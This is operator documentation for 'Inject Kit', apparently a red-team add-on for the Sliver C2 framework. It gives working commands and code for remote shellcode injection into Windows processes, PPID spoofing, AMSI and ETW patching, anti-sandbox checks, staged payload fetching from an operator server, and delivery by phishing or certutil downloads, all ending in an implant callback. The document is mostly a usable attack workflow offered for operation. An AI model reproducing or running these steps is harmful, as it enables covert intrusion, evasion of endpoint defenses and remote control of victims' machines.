# Inject Kit — Documentation

## Table of Contents

1. [What Is Inject Kit?](#1-what-is-inject-kit)
2. [Why Process Injection?](#2-why-process-injection)
3. [Injection Modes](#3-injection-modes)
4. [PPID Spoofing — How It Works](#4-ppid-spoofing--how-it-works)
5. [Evasion Techniques Explained](#5-evasion-techniques-explained)
6. [Setup](#6-setup)
7. [Usage: Standalone (injectkit.exe)](#7-usage-standalone-injeckitexe)
8. [Usage: Sliver Extension (inject.x64.dll)](#8-usage-sliver-extension-injectx64dll)
9. [Operator Workflow](#9-operator-workflow)
10. [Delivery Methods](#10-delivery-methods)
11. [Architecture](#11-architecture)
12. [Command Reference](#12-command-reference)
13. [Chaining With Other Kits](#13-chaining-with-other-kits)
14. [Troubleshooting](#14-troubleshooting)

---

## 1. What Is Inject Kit?

Inject Kit is a remote process injection toolkit for Sliver C2. It takes any shellcode blob — a Sliver implant, a MaskKit-wrapped payload, a PalaceKit loader — and injects it into a running Windows process using NT-native APIs.

It comes in two forms:

| Component | When to use |
|-----------|-------------|
| `injectkit.exe` | Standalone Windows EXE — deploy when you don't have a Sliver session yet |
| `inject.x64.dll` | Sliver Extension DLL — use from within an existing Sliver session to inject into a second process |

The operator-side `injectkit` CLI (Linux) handles shellcode encryption and staging.

---

## 2. Why Process Injection?

Running shellcode directly inside your own process (self-injection) is the simplest approach but the easiest to detect:

- The process is an unsigned, unknown EXE
- Its memory contains executable shellcode
- It dies after the shellcode finishes
- No legitimate process would behave this way

Process injection moves the shellcode into a host process that is expected to be running — `explorer.exe`, `RuntimeBroker.exe`, `dllhost.exe`. From the EDR's perspective:

- A known, signed, legitimate process has a new thread
- The thread is executing from a memory region (no PE backing — suspicious, but common in legitimate JIT scenarios)
- The injector exits immediately after injection — no persistent anomalous process

Combined with PPID spoofing, the host process's creation looks legitimate in the process tree. Combined with MaskKit or PalaceKit wrapping the shellcode, the in-memory signature is also degraded.

---

## 3. Injection Modes

### Target Mode (`target=`)

Finds a running process by name and injects into it.

```
inject url=... key=... target=explorer.exe
```

Execution chain:
1. Fetch + decrypt shellcode
2. Find `explorer.exe` PID via `CreateToolhelp32Snapshot`
3. `NtOpenProcess` → process handle
4. `NtAllocateVirtualMemory(RW)` in target process
5. `NtWriteVirtualMemory` → copy shellcode
6. `NtProtectVirtualMemory(RX)` — no RWX window
7. `NtCreateThreadEx` in target process
8. Injector exits / returns to Sliver

### Spawn Mode (`spawn=` + `ppid=`)

Spawns a new sacrificial process with a spoofed parent PID, then injects into it.

```
inject url=... key=... spawn=RuntimeBroker.exe ppid=explorer.exe
```

Execution chain:
1. Fetch + decrypt shellcode
2. Find `explorer.exe` PID (the spoofed parent)
3. `OpenProcess(PROCESS_CREATE_PROCESS)` on explorer
4. `InitializeProcThreadAttributeList` + `UpdateProcThreadAttribute(PARENT_PROCESS=explorer)`
5. `CreateProcessW(RuntimeBroker.exe, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT)`
6. New process appears to have been spawned by explorer.exe in all process-tree views
7. Remote inject into the new process (same NT API chain as target mode)
8. Injector exits

---

## 4. PPID Spoofing — How It Works

Windows tracks a process's parent PID at creation time. Tools like Process Explorer, Sysmon, and most EDRs use the parent-child relationship to build a process tree and flag anomalies:

```
cmd.exe → powershell.exe → injectkit.exe → RuntimeBroker.exe
```
This chain is obviously suspicious — `injectkit.exe` spawning `RuntimeBroker.exe` is not normal.

With PPID spoofing:
```
explorer.exe → RuntimeBroker.exe
```
`RuntimeBroker.exe` reports `explorer.exe` as its parent, regardless of who actually created it.

The mechanism is the `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` attribute in the Windows Extended Startup Info API:

```c
HANDLE hExplorer = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, explorer_pid);

LPPROC_THREAD_ATTRIBUTE_LIST attr = /* allocate */;
InitializeProcThreadAttributeList(attr, 1, 0, &size);
UpdateProcThreadAttribute(attr, 0,
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
    &hExplorer, sizeof(HANDLE), NULL, NULL);

STARTUPINFOEXW si = { .lpAttributeList = attr };
CreateProcessW(L"RuntimeBroker.exe", ...,
    CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, ..., &si, &pi);
```

The resulting process has `explorer.exe` recorded as its parent in the kernel's process table — this is what `NtQueryInformationProcess(ProcessBasicInformation)` returns, which is what all process tree tools read.

**Limitation**: PPID spoofing affects the recorded parent PID only. It does not affect:
- The security token (process still has your user's token, not explorer's)
- Thread stack (your injector's address isn't on any call stack)
- The actual creator (kernel knows the real creator via audit events)

Sysmon Event ID 1 with `ParentImage` based on PPID will show `explorer.exe`. Some EDRs that correlate the kernel's real-creator with the PPID field may flag the mismatch.

---

## 5. Evasion Techniques Explained

### No RWX Pages

The single biggest shellcode-detection heuristic is a memory region marked `PAGE_EXECUTE_READWRITE`. Real code is RX (execute only). Real data is RW. RWX means someone is writing and executing from the same region — a classic shellcode pattern.

InjectKit never creates RWX memory:
1. `NtAllocateVirtualMemory(PAGE_READWRITE)` — allocate writable region
2. `NtWriteVirtualMemory` — copy shellcode in
3. `NtProtectVirtualMemory(PAGE_EXECUTE_READ)` — flip to RX
4. `NtCreateThreadEx` — start execution from the now-RX region

The memory is never simultaneously writable and executable.

### NT-Native APIs

EDR products install user-mode hooks on high-level Win32 functions — `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread` in `kernel32.dll`. These hooks redirect calls to the EDR's monitoring code before they reach the actual implementation.

InjectKit bypasses this by calling the NT layer directly — `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx` in `ntdll.dll`. These sit below the hooked layer. Some EDRs also hook ntdll, but it requires more effort and is less common.

The function names are still string literals in the binary. Compile with `make runner-garble` (requires `garble`) to obfuscate them.

### AMSI and ETW Bypass (standalone EXE only)

The standalone `injectkit.exe` patches two telemetry points before doing anything:

**AMSI**: `AmsiScanBuffer` is patched to return `E_INVALIDARG` (0x80070057). Windows Defender and other AV products call `AmsiScanBuffer` to scan memory buffers. With this patch, every scan returns "not applicable to this provider" and is ignored.

**ETW**: `EtwEventWrite` is patched with a single `ret` instruction. The process stops emitting any ETW events — this prevents Sysmon, Windows Defender, and other ETW consumers from receiving process activity events from within this process.

Note: These patches apply within the injector process only. The shellcode running in the target process is unaffected by these patches (it's in a separate process). The shellcode itself (e.g., from MaskKit) should include its own ETW/AMSI bypass if needed.

### Anti-Sandbox

Two checks before doing anything:

1. **Sleep timing**: `time.Sleep(3s)` — if less than 2 seconds pass, a sandbox is accelerating time. Exit silently.
2. **CPU count**: `runtime.NumCPU() < 2` — most sandbox VMs run on a single core. Exit silently.

A silent exit (no error, no output) is less suspicious to automated analysis than a crash or explicit "sandbox detected" message.

---

## 6. Setup

**Prerequisites:**
- Go 1.21+: `go version`
- mingw-w64: `apt install mingw-w64`

```bash
cd Inject-Kit/injectkit
make all
```

This produces:
- `./injectkit` — operator CLI (Linux)
- `build/injectkit.exe` — standalone Windows EXE
- `build/inject.x64.dll` — Sliver Extension DLL
- `build/inject-0.1.0.tar.gz` — Sliver Extension tarball

---

## 7. Usage: Standalone (`injectkit.exe`)

The standalone EXE runs directly on the target Windows machine. No Sliver session required.

### Stager mode — inject into existing process

```cmd
injectkit.exe -mode stager -url https://192.168.1.10:8443/p -key a1b2c3... -target explorer.exe
```

### Stager mode — spawn with PPID spoof and inject

```cmd
injectkit.exe -mode stager -url https://192.168.1.10:8443/p -key a1b2c3... -spawn RuntimeBroker.exe -ppid explorer.exe
```

### Direct mode — shellcode baked in (no staging server)

Generate the byte arrays:
```bash
python3 -c "
import os, sys
key = os.urandom(32)
sc  = open(sys.argv[1], 'rb').read()
enc = bytes(b ^ key[i % len(key)] for i, b in enumerate(sc))
print('var xorKey = []byte{' + ', '.join(hex(b) for b in key) + '}')
print('var encShellcode = []byte{' + ', '.join(hex(b) for b in enc) + '}')
" implant.bin
```

Paste into `runner/shellcode.go`, compile, deploy:
```bash
make runner
# Copy build/injectkit.exe to target
injectkit.exe -mode direct -target explorer.exe
```

### Delivery

The standalone EXE needs to reach the target by some means. Options:
- Upload via Sliver `upload` command (if you have a session in another process)
- Deliver via phishing, USB, exploit
- Serve it and download via `curl`, PowerShell `WebClient`, `certutil`

The EXE exits silently after injection — no console output by design.

---

## 8. Usage: Sliver Extension (`inject.x64.dll`)

The Sliver Extension runs in the context of an existing Sliver session, injecting shellcode into a second process from within that session.

### Install (once per Sliver server)

```bash
make all
```

In Sliver:
```
sliver (TARGET)> extensions install build/inject-0.1.0.tar.gz
[*] Installing extension 'inject' (v0.1.0) ... done
```

### Inject into existing process

```
sliver (TARGET)> inject url=https://192.168.1.10:8443/p key=a1b2c3... target=explorer.exe
[+] injected into explorer.exe (pid 1234) — shellcode running
```

### Spawn + inject with PPID spoof

```
sliver (TARGET)> inject url=https://192.168.1.10:8443/p key=a1b2c3... spawn=RuntimeBroker.exe ppid=explorer.exe
[+] spawned RuntimeBroker.exe (pid 5678) with ppid spoofed to explorer.exe — shellcode running
```

After successful injection, your second Sliver beacon calls back from within the target process.

---

## 9. Operator Workflow

Full operator-side workflow for each engagement:

### Prepare shellcode

```bash
# Option 1: raw Sliver shellcode
sliver > generate --format shellcode --os windows --arch amd64 --mtls 192.168.1.10 --save implant.bin

# Option 2: MaskKit-wrapped (sleep masking)
./maskkit wrap --shellcode implant.bin --threshold 5000 --output masked.bin

# Option 3: PalaceKit-wrapped (Crystal Palace loader)
./palacekit build --shellcode implant.bin --output palace.bin
```

### Encrypt and stage

```bash
./injectkit stage \
    --shellcode implant.bin \
    --url https://192.168.1.10:8443 \
    --serve
```

Note: When `--serve` is used, only the host:port is needed — the path is auto-generated and printed in the output.

Copy the printed commands and use whichever delivery path fits the engagement.

### Re-serve for a second attempt

```bash
./injectkit serve --payload build/payload.enc --port 8443
```

Note: `injectkit serve` generates a new random URL path each time it runs. You must update the `--url` in your `injectkit.exe` or Sliver extension command to use the URL printed by `serve`.

---

## 10. Delivery Methods

### Getting `injectkit.exe` to the target

| Method | Notes |
|--------|-------|
| Sliver `upload` | Requires existing session in another process |
| Phishing attachment | EXE or wrapped in Office macro / LNK |
| Living-off-the-land download | `certutil -urlcache -f`, `curl`, PowerShell `WebClient` |
| USB / physical access | Air-gapped environments |

### Getting shellcode to the target (stager mode)

The staging server runs on the operator machine (`injectkit stage --serve`). The target fetches payload over HTTPS with a randomised URL. The server shuts down after one download.

For the Sliver Extension, the Sliver agent's existing C2 channel is NOT used for payload delivery — the shellcode is fetched separately from the operator's staging server. This keeps large payloads off the C2 channel.

---

## 11. Architecture

```
Operator (Linux)                   Target (Windows)
────────────────                   ────────────────
injectkit stage                    injectkit.exe   OR   inject.x64.dll
  │                                  │                     │
  ├─ random 32-byte XOR key          │                     │
  ├─ XOR encrypt shellcode           │                     │
  ├─ write payload.enc               │                     │
  ├─ print commands                  │                     │
  └─ one-shot HTTPS server  ─────────┤─────────────────────┤
                                     │  HTTPS fetch         │
                                     │  XOR decrypt         │
                                     │                     │
                                     ▼                     ▼
                              [target process]      [target process]
                              NtOpenProcess         NtOpenProcess (or spawn)
                              NtAllocVM(RW)         NtAllocVM(RW)
                              NtWriteVM             NtWriteVM
                              NtProtectVM(RX)       NtProtectVM(RX)
                              NtCreateThreadEx      NtCreateThreadEx
                                     │                     │
                                     └──── Sliver callback ─┘
```

---

## 12. Command Reference

### Operator CLI (`injectkit`)

```
injectkit stage   --shellcode <file> --url <url> [--serve] [--port 8443] [-o build]
injectkit serve   --payload <file> [--port 8443]
injectkit bundle  [--output build/inject-0.1.0.tar.gz]
```

### Standalone runner (`injectkit.exe`)

```
-mode string    stager | direct (default: stager)
-url string     shellcode URL (stager mode)
-key string     hex XOR key (stager mode)
-target string  inject into this running process
-spawn string   spawn this process and inject into it
-ppid string    process to spoof as parent when -spawn is used (default: explorer.exe)
```

### Sliver Extension (`inject`)

```
inject url=<url> key=<hex> target=<process.exe>
inject url=<url> key=<hex> spawn=<process.exe> ppid=<parent.exe>
```

---

## 13. Chaining With Other Kits

InjectKit is most effective when the injected shellcode is itself hardened. The full chain:

**1. Generate Sliver shellcode**
```bash
sliver > generate --format shellcode --os windows --arch amd64 --mtls 192.168.1.10 --save implant.bin
```

**2. Wrap with MaskKit (sleep masking + stack spoof)**
```bash
./maskkit wrap --shellcode implant.bin --threshold 5000 --output masked.bin
```

**3. Wrap with PalaceKit (Crystal Palace loader)**
```bash
./palacekit build --shellcode masked.bin --output palace.bin
```

**4. Stage with InjectKit**
```bash
./injectkit stage --shellcode palace.bin --url https://192.168.1.10:8443/p --serve
```

**5. Inject (via Sliver Extension in an existing session)**
```
sliver (TARGET)> inject url=https://192.168.1.10:8443/p key=... spawn=RuntimeBroker.exe ppid=explorer.exe
```

The injected shellcode is a PalaceKit blob → which decrypts and runs a MaskKit blob → which decrypts and runs Sliver shellcode → which calls back. Three layers of encryption + process injection + PPID spoofing.

---

## 14. Troubleshooting

**`NtOpenProcess` fails with `0xC0000022` (ACCESS_DENIED)**
You need `SeDebugPrivilege` to open protected processes. Some targets (e.g. `svchost.exe` running as SYSTEM) are not openable from a user-level process. Switch to a user-accessible target: `explorer.exe`, `RuntimeBroker.exe`, `SearchHost.exe`.

**`CreateProcessW` fails in spawn mode**
The target EXE path must be absolute or resolvable. Common processes: `C:\Windows\System32\RuntimeBroker.exe`. Check that the binary exists on the target.

**Sliver callback never appears after injection**
The shellcode is running in the target process. Check:
- Firewall rules allow outbound from the target process
- Sliver listener is running and the beacon is configured for the right IP/port
- The shellcode architecture matches (x64 injector → x64 shellcode only)

**Extension not found in Sliver**
Re-install: `sliver (TARGET)> extensions install build/inject-0.1.0.tar.gz`. The extension persists for the Sliver server's lifetime, not per-session.
